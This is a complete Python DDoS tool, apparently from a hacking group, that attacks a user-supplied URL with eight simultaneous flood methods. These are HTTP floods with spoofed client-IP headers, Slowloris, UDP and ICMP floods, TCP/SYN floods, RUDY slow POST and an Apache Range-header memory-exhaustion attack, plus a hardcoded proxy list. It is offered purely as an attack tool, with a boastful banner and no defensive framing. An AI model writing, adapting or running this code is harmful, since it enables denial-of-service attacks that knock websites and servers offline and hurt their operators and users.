#!/usr/bin/env python3
# X-ValeZ DDoS Termux/Kali Edition v6.0 - 8 Layer Brutal Mode
# By HexZ Team | AmbaRusV2 Edition
# "Fuck yeah, Termux/Kali - No root, 8 layers of pure pain!"

import os
import sys
import time
import json
import random
import socket
import struct
import hashlib
import threading
import subprocess
import urllib3
import requests
import ssl
import http.client
import ipaddress
from queue import Queue
from datetime import datetime
from urllib.parse import urlparse

# Coba import colorama, fallback if not installed
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    class Style:
        RESET_ALL = '\033[0m'

# ==================== CONFIG ====================
VERSION = "6.0"
MAX_THREADS = 5000
DEFAULT_THREADS = 2000
DEFAULT_DURATION = 180
DEFAULT_PACKET_SIZE = 2048

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.tiktok.com/",
    "https://www.reddit.com/"
]

# ==================== BANNER ====================
def show_banner():
    banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗              ║
║    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝              ║
║    ███████║   ██║      ██║   ███████║██║     █████╔╝               ║
║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗               ║
║    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗              ║
║    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝              ║
║                                                                      ║
║                ╔═══════════════════════════════╗                    ║
║                ║        By HexZ Team           ║                    ║
║                ╚═══════════════════════════════╝                    ║
║                                                                      ║
║      "{Fore.YELLOW}Fuck yeah! 8 layers - No root, All brutal!{Fore.RED}"        ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

# ==================== DOMAIN RESOLVER ====================
class DomainResolver:
    @staticmethod
    def resolve(target_url):
        parsed = urlparse(target_url)
        host = parsed.netloc.split(":")[0]
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        try:
            ip = socket.gethostbyname(host)
            return ip, port, host
        except:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(host, 'A')
                ip = str(answers[0])
                return ip, port, host
            except:
                return host, port, host

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.lock = threading.Lock()
        self.load_proxies()
    def load_proxies(self):
        real_proxies = [
            "190.61.38.18:8080", "200.105.146.186:999", "45.235.191.120:8080",
            "190.97.196.79:999", "200.75.136.194:999", "190.61.46.244:8080",
            "190.242.215.189:999", "190.151.139.251:999", "45.235.47.77:999",
            "190.61.38.96:8080", "200.69.246.21:999", "45.177.108.103:8080",
            "190.61.38.18:80", "200.105.146.186:80", "45.235.191.120:80",
            "190.97.196.79:80", "200.75.136.194:80", "190.61.46.244:80",
            "190.242.215.189:80", "190.151.139.251:80", "45.235.47.77:80",
            "103.152.112.120:8080", "103.152.112.157:8080", "103.152.112.158:8080",
            "103.152.112.159:8080", "103.152.112.160:8080", "103.152.112.161:8080"
        ]
        self.proxies = [f"http://{p}" for p in real_proxies]
        self.proxies.extend([f"socks5://{p}" for p in real_proxies])
        for _ in range(1000):
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            port = random.randint(1000, 9999)
            self.proxies.append(f"http://{ip}:{port}")
            self.proxies.append(f"socks5://{ip}:{port}")
    def get_random_proxy(self):
        with self.lock:
            return random.choice(self.proxies) if self.proxies else None

# ==================== LAYER 1: HTTP/2 FLOOD ====================
class HttpFlood:
    def __init__(self, target, ip, port, threads, duration, packet_size):
        self.target = target
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.packet_size = packet_size
        self.running = True
        self.stats = {"requests": 0, "bytes": 0, "errors": 0}
        self.lock = threading.Lock()
        self.proxy_manager = ProxyManager()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc.split(":")[0]
        self.path = self.parsed.path or "/"
        self.is_https = self.parsed.scheme == "https"
    def _generate_payload(self):
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"]
        method = random.choice(methods)
        headers = f"{method} {self.path} HTTP/1.1\r\n"
        headers += f"Host: {self.host}\r\n"
        headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        headers += f"Accept: {random.choice(['*/*', 'text/html', 'application/json'])}\r\n"
        headers += f"Accept-Encoding: gzip, deflate, br\r\n"
        headers += f"Accept-Language: {random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'en;q=0.9,id;q=0.8'])}\r\n"
        headers += f"Connection: {random.choice(['keep-alive', 'close'])}\r\n"
        headers += f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
        headers += f"Pragma: no-cache\r\n"
        headers += f"Referer: {random.choice(REFERERS)}\r\n"
        spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers += f"X-Forwarded-For: {spoofed_ip}\r\n"
        headers += f"X-Real-IP: {spoofed_ip}\r\n"
        headers += f"Client-IP: {spoofed_ip}\r\n"
        for _ in range(random.randint(1, 3)):
            headers += f"X-{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}: {hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}\r\n"
        if method in ["POST", "PUT", "PATCH"]:
            body_length = random.randint(1024, self.packet_size * 2)
            body = hashlib.md5(os.urandom(body_length)).hexdigest() * (body_length // 32 + 1)
            body = body[:body_length]
            headers += f"Content-Type: {random.choice(['application/x-www-form-urlencoded', 'multipart/form-data', 'application/json'])}\r\n"
            headers += f"Content-Length: {len(body)}\r\n"
            return headers + "\r\n" + body
        else:
            return headers + "\r\n"
    def _attack_worker(self):
        while self.running:
            try:
                payload = self._generate_payload()
                method = payload.split(" ")[0]
                if self.is_https:
                    conn = http.client.HTTPSConnection(self.host, timeout=3, context=ssl._create_unverified_context())
                else:
                    conn = http.client.HTTPConnection(self.host, timeout=3)
                body = None
                if method in ["POST", "PUT", "PATCH"]:
                    parts = payload.split("\r\n\r\n")
                    if len(parts) > 1:
                        body = parts[1]
                conn.request(method, self.path, body=body)
                response = conn.getresponse()
                with self.lock:
                    self.stats["requests"] += 1
                    self.stats["bytes"] += len(payload)
                conn.close()
                time.sleep(random.uniform(0.0001, 0.001))
            except:
                with self.lock:
                    self.stats["errors"] += 1
                continue
    def start(self):
        print(f"{Fore.GREEN}[✓] Layer 1: HTTP/2 Flood started with {self.threads} threads{Style.RESET_ALL}")
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(2)
            with self.lock:
                print(f"{Fore.CYAN}[Layer 1] Req: {self.stats['requests']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB | Errors: {self.stats['errors']}{Style.RESET_ALL}")
        self.running = False

# ==================== LAYER 2: SLOWLORIS ====================
class Slowloris:
    def __init__(self, target, ip, port, threads, duration):
        self.target = target
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.running = True
        self.sockets = []
        self.lock = threading.Lock()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc.split(":")[0]
        self.path = self.parsed.path or "/"
        self.is_https = self.parsed.scheme == "https"
    def _create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.ip, self.port))
            if self.is_https:
                try:
                    import ssl
                    sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLS)
                except:
                    pass
            request = f"GET {self.path} HTTP/1.1\r\n"
            request += f"Host: {self.host}\r\n"
            request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            request += "Accept: */*\r\n"
            request += "Accept-Encoding: gzip, deflate\r\n"
            sock.send(request.encode())
            with self.lock:
                self.sockets.append(sock)
            return True
        except:
            return False
    def _keep_alive(self):
        while self.running:
            with self.lock:
                for sock in self.sockets[:]:
                    try:
                        sock.send(f"X-{random.randint(1,999999)}: {random.randint(1,999999)}\r\n".encode())
                    except:
                        try:
                            self.sockets.remove(sock)
                            sock.close()
                        except:
                            pass
            time.sleep(random.uniform(5, 15))
    def _worker(self):
        while self.running:
            target_count = self.threads * 3
            if len(self.sockets) < target_count:
                for _ in range(min(10, target_count - len(self.sockets))):
                    self._create_socket()
            time.sleep(random.uniform(0.05, 0.1))
    def start(self):
        print(f"{Fore.GREEN}[✓] Layer 2: Slowloris started with {self.threads} sockets{Style.RESET_ALL}")
        workers = []
        for _ in range(self.threads // 20 + 1):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
            workers.append(t)
        keep_alive_t = threading.Thread(target=self._keep_alive)
        keep_alive_t.daemon = True
        keep_alive_t.start()
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(3)
            with self.lock:
                print(f"{Fore.CYAN}[Layer 2] Active sockets: {len(self.sockets)}{Style.RESET_ALL}")
        self.running = False
        with self.lock:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass

# ==================== LAYER 3: UDP AMPLIFICATION ====================
class UDPFlood:
    def __init__(self, target, ip, port, threads, duration, packet_size):
        self.target = target
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.packet_size = packet_size
        self.running = True
        self.stats = {"packets": 0, "bytes": 0}
        self.lock = threading.Lock()
    def _generate_payload(self):
        payload_types = [
            os.urandom(self.packet_size),
            b'\x00' * self.packet_size,
            b'\xff' * self.packet_size,
            hashlib.md5(os.urandom(64)).digest() * (self.packet_size // 16 + 1)
        ]
        return random.choice(payload_types)[:self.packet_size]
    def _worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while self.running:
            try:
                payload = self._generate_payload()
                target_port = random.choice([80, 53, 123, 161, 443, 8080, 8443, 5000])
                sock.sendto(payload, (self.ip, target_port))
                with self.lock:
                    self.stats["packets"] += 1
                    self.stats["bytes"] += len(payload)
                time.sleep(random.uniform(0.00001, 0.0001))
            except:
                continue
    def start(self):
        print(f"{Fore.GREEN}[✓] Layer 3: UDP Amplification started with {self.threads} threads{Style.RESET_ALL}")
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
            threads.append(t)
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(2)
            with self.lock:
                print(f"{Fore.CYAN}[Layer 3] Packets: {self.stats['packets']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB{Style.RESET_ALL}")
        self.running = False

# ==================== LAYER 4: ICMP FRAGMENT ====================
class ICMPFlood:
    def __init__(self, target, ip, threads, duration, packet_size):
        self.target = target
        self.ip = ip
        self.threads = threads
        self.duration = duration
        self.packet_size = packet_size
        self.running = True
        self.stats = {"packets": 0, "bytes": 0}
        self.lock = threading.Lock()
        self.use_ping = False
    def _create_icmp_packet(self):
        type_code = 8
        code = 0
        checksum = 0
        identifier = random.randint(1, 65535)
        sequence = random.randint(1, 65535)
        payload = os.urandom(self.packet_size)
        packet = struct.pack("!BBHHH", type_code, code, checksum, identifier, sequence) + payload
        checksum = self._checksum(packet)
        packet = struct.pack("!BBHHH", type_code, code, checksum, identifier, sequence) + payload
        return packet
    def _checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff
    def _worker_raw(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            while self.running:
                try:
                    packet = self._create_icmp_packet()
                    sock.sendto(packet, (self.ip, 0))
                    with self.lock:
                        self.stats["packets"] += 1
                        self.stats["bytes"] += len(packet)
                    time.sleep(random.uniform(0.00001, 0.0001))
                except:
                    continue
        except PermissionError:
            print(f"{Fore.YELLOW}[!] ICMP raw requires root. Falling back to ping flood.{Style.RESET_ALL}")
            self.use_ping = True
            self._worker_ping()
        except:
            pass
    def _worker_ping(self):
        import subprocess
        while self.running:
            try:
                cmd = f"ping -c 1 -s {self.packet_size} {self.ip} > /dev/null 2>&1"
                subprocess.run(cmd, shell=True, timeout=2)
                with self.lock:
                    self.stats["packets"] += 1
                    self.stats["bytes"] += self.packet_size
                time.sleep(random.uniform(0.001, 0.01))
            except:
                continue
    def start(self):
        print(f"{Fore.GREEN}[✓] Layer 4: ICMP Fragment Flood started{Style.RESET_ALL}")
        threads = []
        for _ in range(min(self.threads, 50)):
            t = threading.Thread(target=self._worker_raw)
            t.daemon = True
            t.start()
            threads.append(t)
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(2)
            with self.lock:
                print(f"{Fore.CYAN}[Layer 4] Packets: {self.stats['packets']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB{Style.RESET_ALL}")
        self.running = False

# ==================== LAYER 5: SYN SPOOF ====================
class SYNFlood:
    def __init__(self, target, ip, port, threads, duration):
        self.target = target
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = {"packets": 0}
        self.lock = threading.Lock()
    def _worker_raw(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            while self.running:
                try:
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    packet = b'SYN' * 100
                    sock.sendto(packet, (self.ip, self.port))
                    with self.lock:
                        self.stats["packets"] += 1
                    time.sleep(random.uniform(0.00001, 0.0001))
                except:
                    continue
        except PermissionError:
            print(f"{Fore.YELLOW}[!] SYN flood raw requires root. Using TCP connect flood instead.{Style.RESET_ALL}")
            self._worker_tcp()
        except:
            pass
    def _worker_tcp(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.ip, self.port))
                sock.close()
                with self.lock:
                    self.stats["packets"] += 1
                time.sleep(random.uniform(0.001, 0.01))
            except:
                continue
    def start(self):
        print(f"{Fore.GREEN}[✓] Layer 5: SYN/TCP Flood started with {self.threads} threads{Style.RESET_ALL}")
        threads = []
        for _ in range(min(self.threads, 100)):
            t = threading.Thread(target=self._worker_raw)
            t.daemon = True
            t.start()
            threads.append(t)
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(2)
            with self.lock:
                print(f"{Fore.CYAN}[Layer 5] SYN packets: {self.stats['packets']}{Style.RESET_ALL}")
        self.running = False

# ==================== LAYER 6: MULTI-VECTOR ====================
class MultiVector:
    def __init__(self, target, ip, port, threads, duration, packet_size):
        self.target = target
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.packet_size = packet_size
        self.running = True
        self.stats = {"packets": 0, "bytes": 0}
        self.lock = threading.Lock()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc.split(":")[0]
        self.path = self.parsed.path or "/"
    def _multi_vector_worker(self):
        while self.running:
            try:
                attack_type = random.randint(1, 5)
                if attack_type == 1:
                    params = f"?{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}={random.randint(1,999999)}"
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.ip, self.port))
                    req = f"GET {self.path}{params} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
                    sock.send(req.encode())
                    sock.close()
                elif attack_type == 2:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    target_port = random.choice([80, 443, 53, 123, 161, 8080])
                    sock.sendto(os.urandom(self.packet_size), (self.ip, target_port))
                    sock.close()
                elif attack_type == 3:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.ip, self.port))
                    sock.close()
                elif attack_type == 4:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.ip, self.port))
                    body = os.urandom(self.packet_size)
                    req = f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: {len(body)}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode() + body
                    sock.send(req)
                    sock.close()
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
                    sock.sendto(dns_query, (self.ip, 53))
                    sock.close()
                with self.lock:
                    self.stats["packets"] += 1
                    self.stats["bytes"] += self.packet_size
                time.sleep(random.uniform(0.00001, 0.001))
            except:
                continue
    def start(self):
        print(f"{Fore.GREEN}[✓] Layer 6: Multi-Vector Combined started with {self.threads} threads{Style.RESET_ALL}")
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._multi_vector_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(2)
            with self.lock:
                print(f"{Fore.CYAN}[Layer 6] Packets: {self.stats['packets']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB{Style.RESET_ALL}")
        self.running = False

# ==================== LAYER 7: RUDY ATTACK (SLOW POST) ====================
class RUDYAttack:
    """Layer 7: RUDY - Slow POST attack (ties up server threads)"""
    def __init__(self, target, ip, port, threads, duration):
        self.target = target
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = {"connections": 0, "bytes": 0}
        self.lock = threading.Lock()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc.split(":")[0]
        self.path = self.parsed.path or "/"
    def _rudy_worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.ip, self.port))
                content_length = random.randint(1000000, 10000000)
                headers = f"POST {self.path} HTTP/1.1\r\n"
                headers += f"Host: {self.host}\r\n"
                headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                headers += f"Content-Type: application/x-www-form-urlencoded\r\n"
                headers += f"Content-Length: {content_length}\r\n"
                headers += "\r\n"
                sock.send(headers.encode())
                with self.lock:
                    self.stats["connections"] += 1
                chunk_size = 10
                sent = 0
                while self.running and sent < content_length:
                    chunk = hashlib.md5(str(random.random()).encode()).hexdigest()[:chunk_size].encode()
                    sock.send(chunk)
                    sent += len(chunk)
                    with self.lock:
                        self.stats["bytes"] += len(chunk)
                    time.sleep(random.uniform(1, 5))  # Slow
                sock.close()
            except:
                continue
    def start(self):
        print(f"{Fore.GREEN}[✓] Layer 7: RUDY Slow POST started with {self.threads} threads{Style.RESET_ALL}")
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._rudy_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(3)
            with self.lock:
                print(f"{Fore.CYAN}[Layer 7] Connections: {self.stats['connections']} | Bytes: {self.stats['bytes']/1024/1024:.2f}MB{Style.RESET_ALL}")
        self.running = False

# ==================== LAYER 8: APACHE KILLER (RANGE HEADER) ====================
class ApacheKiller:
    """Layer 8: Apache Killer - Range header attack (causes memory exhaustion)"""
    def __init__(self, target, ip, port, threads, duration):
        self.target = target
        self.ip = ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = {"requests": 0}
        self.lock = threading.Lock()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc.split(":")[0]
        self.path = self.parsed.path or "/"
    def _apache_killer_worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.ip, self.port))
                ranges = ",".join([f"{i}-{i+100}" for i in range(0, 5000, 200)])
                headers = f"GET {self.path} HTTP/1.1\r\n"
                headers += f"Host: {self.host}\r\n"
                headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                headers += f"Range: bytes={ranges}\r\n"
                headers += "Accept-Encoding: identity\r\n"
                headers += "Connection: close\r\n"
                headers += "\r\n"
                sock.send(headers.encode())
                sock.settimeout(30)
                try:
                    while True:
                        data = sock.recv(1024)
                        if not data:
                            break
                except:
                    pass
                sock.close()
                with self.lock:
                    self.stats["requests"] += 1
            except:
                continue
    def start(self):
        print(f"{Fore.GREEN}[✓] Layer 8: Apache Killer started with {self.threads} threads{Style.RESET_ALL}")
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._apache_killer_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(2)
            with self.lock:
                print(f"{Fore.CYAN}[Layer 8] Requests: {self.stats['requests']}{Style.RESET_ALL}")
        self.running = False

# ==================== MAIN CONTROLLER ====================
class XValeZController:
    def __init__(self):
        self.target = None
        self.ip = None
        self.port = None
        self.host = None
        self.threads = DEFAULT_THREADS
        self.duration = DEFAULT_DURATION
        self.packet_size = DEFAULT_PACKET_SIZE
    def get_user_input(self):
        print(f"{Fore.YELLOW}")
        self.target = input("Enter target URL (http:// or https://): ").strip()
        if not self.target.startswith(("http://", "https://")):
            self.target = "http://" + self.target
        self.ip, self.port, self.host = DomainResolver.resolve(self.target)
        if not self.ip:
            self.ip = self.host
        print(f"{Fore.GREEN}[+] Resolved IP: {self.ip}{Style.RESET_ALL}")
        threads_input = input("Enter thread count (default 2000): ").strip()
        self.threads = int(threads_input) if threads_input.isdigit() else DEFAULT_THREADS
        self.threads = min(self.threads, MAX_THREADS)
        duration_input = input("Enter attack duration in seconds (default 180): ").strip()
        self.duration = int(duration_input) if duration_input.isdigit() else DEFAULT_DURATION
        packet_input = input("Enter packet size in bytes (default 2048): ").strip()
        self.packet_size = int(packet_input) if packet_input.isdigit() else DEFAULT_PACKET_SIZE
        print(f"{Style.RESET_ALL}")
    def show_config(self):
        print(f"{Fore.GREEN}")
        print(f"[+] Target: {self.target}")
        print(f"[+] Resolved IP: {self.ip}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Duration: {self.duration} seconds")
        print(f"[+] Packet size: {self.packet_size} bytes")
        print(f"{Style.RESET_ALL}")
    def start_attack(self):
        print(f"{Fore.RED}")
        print("[==================================================]")
        print("[  X-ValeZ - 8 LAYER BRUTAL MODE ACTIVE ]")
        print("[==================================================]")
        print(f"{Style.RESET_ALL}")
        layer_threads = max(1, self.threads // 8)
        # Layer 1
        http_flood = HttpFlood(self.target, self.ip, self.port, layer_threads, self.duration, self.packet_size)
        # Layer 2
        slowloris = Slowloris(self.target, self.ip, self.port, layer_threads, self.duration)
        # Layer 3
        udp_flood = UDPFlood(self.target, self.ip, self.port, layer_threads, self.duration, self.packet_size)
        # Layer 4
        icmp_flood = ICMPFlood(self.target, self.ip, layer_threads // 2, self.duration, self.packet_size)
        # Layer 5
        syn_flood = SYNFlood(self.target, self.ip, self.port, layer_threads // 2, self.duration)
        # Layer 6
        multi_vector = MultiVector(self.target, self.ip, self.port, layer_threads, self.duration, self.packet_size)
        # Layer 7
        rudy = RUDYAttack(self.target, self.ip, self.port, layer_threads // 2, self.duration)
        # Layer 8
        apache = ApacheKiller(self.target, self.ip, self.port, layer_threads // 2, self.duration)
        attack_threads = []
        t1 = threading.Thread(target=http_flood.start); t1.daemon=True; t1.start(); attack_threads.append(t1)
        t2 = threading.Thread(target=slowloris.start); t2.daemon=True; t2.start(); attack_threads.append(t2)
        t3 = threading.Thread(target=udp_flood.start); t3.daemon=True; t3.start(); attack_threads.append(t3)
        t4 = threading.Thread(target=icmp_flood.start); t4.daemon=True; t4.start(); attack_threads.append(t4)
        t5 = threading.Thread(target=syn_flood.start); t5.daemon=True; t5.start(); attack_threads.append(t5)
        t6 = threading.Thread(target=multi_vector.start); t6.daemon=True; t6.start(); attack_threads.append(t6)
        t7 = threading.Thread(target=rudy.start); t7.daemon=True; t7.start(); attack_threads.append(t7)
        t8 = threading.Thread(target=apache.start); t8.daemon=True; t8.start(); attack_threads.append(t8)
        start_time = time.time()
        while time.time() - start_time < self.duration:
            time.sleep(5)
            remaining = int(self.duration - (time.time() - start_time))
            print(f"{Fore.YELLOW}[Live] Time remaining: {remaining}s | 8 layers active{Style.RESET_ALL}")
        print(f"{Fore.RED}")
        print("[==================================================]")
        print("[  ATTACK COMPLETED - MISSION ACCOMPLISHED ]")
        print("[==================================================]")
        print(f"{Style.RESET_ALL}")

# ==================== ENTRY POINT ====================
def main():
    try:
        show_banner()
        controller = XValeZController()
        controller.get_user_input()
        controller.show_config()
        controller.start_attack()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Attack stopped by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()